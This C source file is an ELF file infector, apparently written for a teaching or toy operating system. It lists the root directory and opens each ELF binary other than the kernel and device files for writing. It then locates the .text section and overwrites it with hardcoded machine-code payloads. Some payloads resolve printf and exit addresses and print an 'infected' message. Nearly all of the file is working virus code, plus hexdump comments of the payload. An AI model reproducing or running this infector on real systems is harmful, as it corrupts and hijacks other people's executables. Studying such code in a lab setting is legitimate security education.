// #include "elf_local.h"
#include "stdio.h"
#include "string.h"
#include <elf.h>

int n_cmp(char *a, char *b, int n) {
    int i = 0;
    for (i = 0; i < n; i++) {
        if (a[i] != b[i]) {
            return 1;
        }
    }
    return 0;
}

int is_elf(Elf32_Ehdr elf_ehdr) {
    // e_ident = 0x7fELF
    return (n_cmp((char*)elf_ehdr.e_ident, (char*)ELFMAG, SELFMAG) == 0);
}

void cal_addr(int entry, int addr[]) {
    int cal_tmp = entry;
    int i;
    for (i = 0; i < 4; i++) {
        addr[i] = cal_tmp % 256;
        cal_tmp /= 256;
    }
}

void process(char *tmp);

int main() {
    char buf[RESULT_MAX] = {0};
    readdir("/", buf);
    char *files = buf + 3;

    int i = 0;
    int last = 0;
    char tmp[200];
    int count = 0;

    for (i = 1 /*0*/; i < strlen(files); i++) 
    {
        if (files[i] == ' ' && files[i - 1] != ' ') 
        {
            int j = last;
            for (; j < i; j++) {
                tmp[count++] = files[j];
            }

            tmp[count] = '\0';
            printf("%s\n", tmp);
            last = i + 1;
            // goto ifs;

            if (n_cmp(tmp, "dev", 3) != 0 &&
                n_cmp(tmp, "kernel.bin", 10) != 0) 
            {
                process(tmp);
            }
// ifs:
            count = 0;
        }
    }
}

void process(char *tmp)
{
    Elf32_Ehdr elf_ehdr;
    // Program Header Table 结构体
    Elf32_Shdr elf_shdr;
    // Elf32_Sym elf_sym;

    // 不读驱动 不读kernel.bin
    int old_file = open(tmp, O_RDWR);
    read(old_file, &elf_ehdr, sizeof(elf_ehdr));

    // 判断是否是一个 ELF 文件
    printf("%s,", tmp);
    if (!is_elf(elf_ehdr)){printf("it is not a ELF\n"); return;}
    
    printf("it is a ELF , attacking\n");

    int e_sho_off = elf_ehdr.e_shoff;
    int section_num = elf_ehdr.e_shnum;
    int e_shstr_header_index = elf_ehdr.e_shstrndx;//节头名字表的索引
    int e_shstr_off = e_sho_off + e_shstr_header_index * sizeof(elf_shdr);

    lseek(old_file, e_shstr_off, SEEK_SET);//定位到节头名字表节头
    read(old_file, &elf_shdr, sizeof(elf_shdr));
    int shstr_section_off = elf_shdr.sh_offset;
    char shstr_buf[1000];
    lseek(old_file, shstr_section_off, SEEK_SET);
    read(old_file, shstr_buf, 1000);//定位到shstr_tab

    lseek(old_file, e_sho_off, SEEK_SET);//定位到节头表
    int text_off = 0;
    for (int i = 0; i < section_num; i++)
    {
        read(old_file, &elf_shdr, sizeof(elf_shdr));
        if (strcmp(shstr_buf + elf_shdr.sh_name, ".text") == 0)
        {
            text_off = i;
            break;
        }
    }
    int text_offset = e_sho_off + sizeof(elf_shdr) * text_off;  // 找到代码节节头的偏移
    lseek(old_file, text_offset, SEEK_SET);// 定位到text节头的位置
    read(old_file, &elf_shdr, sizeof(elf_shdr));  //读出text节头
    int text_section_offset = elf_shdr.sh_offset;  // 找到代码段的偏移
    int text_size = elf_shdr.sh_size;

    char shellcode[] = { 0x66,0x87,0xdb };
    unsigned char payload[] = {
    0x8d, 0x4c, 0x24, 0x04, 0x83, 0xe4, 0xf0, 0xff, 0x71, 0xfc, 0x55, 0x89, 0xe5, 0x53, 0x51, 0x83, 0xec, 0x10, 0xe8, 0x60, 0x00, 0x00, 0x00, 0x81, 0xc3, 0xe9, 0x2f, 0x00, 0x00, 0xc7, 0x45, 0xec, 0x2d, 0x49, 0x6e, 0x66, 0xc7, 0x45, 0xf0, 0x65, 0x63, 0x74, 0x65, 0xc7, 0x45, 0xf4, 0x64, 0x2d, 0x0a, 0x00, 0xc7, 0x83, 0x0c, 0x00, 0x00, 0x00, 0x6e, 0x10, 0x00, 0x00, 0xc7, 0x83, 0x10, 0x00, 0x00, 0x00, 0xe4, 0x17, 0x00, 0x00, 0x8b, 0x83, 0x0c, 0x00, 0x00, 0x00, 0x83, 0xec, 0x0c, 0x8d, 0x55, 0xec, 0x52, 0xff, 0xd0, 0x83, 0xc4, 0x10, 0x8b, 0x83, 0x10, 0x00, 0x00, 0x00, 0x83, 0xec, 0x0c, 0x6a, 0x00, 0xff, 0xd0, 0x83, 0xc4, 0x10, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x8d, 0x65, 0xf8, 0x59, 0x5b, 0x5d, 0x8d, 0x61, 0xfc, 0xc3, 0x8b, 0x1c, 0x24, 0xc3, 0x66, 0x90, 0x66, 0x90, 0x90, 0x50, 0x51, 0xe8, 0x79, 0xff, 0xff, 0xff, 0xf4
};

    if (strcmp(tmp, "target") == 0)
    {
        printf("TARGET\n");
        lseek(old_file, text_section_offset, SEEK_SET);
        write(old_file, payload, sizeof(payload));
    }
    else
    {
        lseek(old_file, text_section_offset + text_size, SEEK_SET);
        write(old_file, shellcode, sizeof(shellcode));
    }
}

void _process(char *tmp)
{
    Elf32_Ehdr elf_ehdr;
    Elf32_Shdr elf_shdr;
    Elf32_Sym elf_sym;

    int old_file = open(tmp, O_RDWR);
    read(old_file, &elf_ehdr, sizeof(elf_ehdr));

    if (!is_elf(elf_ehdr)) { printf("none-ELF\n"); return; }
    printf("--modifying\n");

    int e_sho_off = elf_ehdr.e_shoff;
    lseek(old_file, e_sho_off + sizeof(elf_shdr), SEEK_SET);
    if (read(old_file, &elf_shdr, sizeof(elf_shdr)) != sizeof(elf_shdr)) printf("sizeof(elf_shdr)\n");

    int text_offset = elf_shdr.sh_offset;
    lseek(old_file, e_sho_off + sizeof(elf_shdr) * 7, SEEK_SET);
    if (read(old_file, &elf_shdr, sizeof(elf_shdr)) != sizeof(elf_shdr)) printf("sizeof(elf_shdr)\n");

    char str_buf[1000];
    int str_offset = elf_shdr.sh_offset;
    lseek(old_file, str_offset, SEEK_SET);
    if(read(old_file, str_buf, sizeof(str_buf)) != sizeof(str_buf)) printf("sizeof(str_buf)\n");

    int sym_num = (str_offset - (e_sho_off + sizeof(elf_shdr) * 8)) / 16;

    lseek(old_file, e_sho_off + sizeof(elf_shdr) * 8, SEEK_SET);

    int i = 0;
    unsigned int printf_address, exit_address;
    int printf_flag = 0, exit_flag = 0;

    for (i = 0; i < sym_num; i++) 
    {
        if (read(old_file, &elf_sym, sizeof(elf_sym)) != sizeof(elf_sym)) printf("sizeof(elf_sym)\n");

printf("str_buf + elf_sym.st_name: %x\n", str_buf + elf_sym.st_name);
printf("st_name: %x\n", elf_sym.st_name);
printf("name: %s\n", str_buf + elf_sym.st_name);

        if (strcmp(str_buf + elf_sym.st_name, "printf") == 0)
        {
            printf_flag = 1;
            printf_address = elf_sym.st_value;
        }
        if (strcmp(str_buf + elf_sym.st_name, "exit") == 0) 
        {
            exit_flag = 1;
            exit_address = elf_sym.st_value;
        }
        if (printf_flag && exit_flag) 
        {
            break;
        }
    }

    if (i == sym_num) printf("can't find printf/exit\n");

    int printf_offset = printf_address - (text_offset + 0x12 + 5);
    int exit_offset = exit_address - (text_offset + 0x1e + 5);

    int printf_off[4]; cal_addr(printf_offset, printf_off);
    int exit_off[4]; cal_addr(exit_offset, exit_off);
    int data_addr[4]; cal_addr(text_offset + 35, data_addr);

    char shellcode[] = {
        0x66, 0x87, 0xdb, 0x89, 0xe5, 0x83, 0xe4, 0xf0, 0x83, 0xec, 0x10, 0xc7, 0x04, 0x24,
        data_addr[0], data_addr[1], data_addr[2],
        data_addr[3], 
        0xe8, 
        printf_off[0], printf_off[1], printf_off[2], printf_off[3],
        0xc7, 0x04, 0x24, 0x00, 0x00, 0x00, 0x00, 0xe8, 
        exit_off[0], exit_off[1],
        exit_off[2],
        exit_off[3],  
        // 0x69, 0x20, 0x61, 0x6d, 0x20,
        0x69, 0x6e, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64, //  infected
        0x0A, 0x00 
    };
    lseek(old_file, text_offset, SEEK_SET);
    write(old_file, shellcode, sizeof(shellcode));
    printf("infect fin.\n");
}

//   0x00001000 8d4c2404 83e4f0ff 71fc5589 e55351e8 .L$.....q.U..SQ.
//   0x00001010 47000000 81c3ec2f 000083ec 08c7c06e G....../.......n
//   0x00001020 10000050 8d8300e0 ffff50e8 3e000000 ...P......P.>...
//   0x00001030 83c41083 ec08c7c0 e4170000 508d8317 ............P...
//   0x00001040 e0ffff50 e8250000 0083c410 b8000000 ...P.%..........
//   0x00001050 008d65f8 595b5d8d 61fcc38b 1c24c390 ..e.Y[].a....$..
//   0x00001060 5051e899 ffffff50 e8770700 00f45589 PQ.....P.w....U.

// 5051e899

// 5051